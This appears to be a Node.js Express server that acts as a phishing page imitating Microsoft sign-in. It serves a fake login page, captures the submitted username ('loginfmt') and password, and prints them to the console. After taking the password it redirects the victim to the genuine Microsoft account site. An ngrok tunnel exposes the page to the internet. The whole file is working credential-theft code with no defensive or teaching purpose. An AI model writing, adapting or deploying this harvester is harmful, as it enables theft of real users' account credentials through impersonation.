let express = require('express')
let app = express()
var bodyParser = require("body-parser")
const { request, response } = require('express')
const { url } = require('inspector')
const { stringify } = require('querystring')
let fs = require('fs')
const ngrok = require('ngrok')


async function connect() {
    let test =  await ngrok.connect({proto: 'http', addr: 8080, region: 'eu'})
    console.log("url : " + test)
}

//middlware
app.use(bodyParser.urlencoded({ extended : false}))
app.use("/public", express.static(__dirname + '/public'))


//Routes
app.get('/', function(request, response) {
  response.sendfile('./public/index.html') 
})

//Envoi du formulaire
app.post('/', (request, response) => {

 

  if (!request.body.passwd){
    response.sendfile('./public/index2.html')
    let login = 'username : ' + request.body.loginfmt + " "
    console.log(login)

  }else{
    response.redirect('https://account.microsoft.com/account?lang=fr-be')
    let password = 'password : ' +  request.body.passwd
    console.log(password)
    ngrok.disconnect()
  }
})

app.listen(8080)
connect()
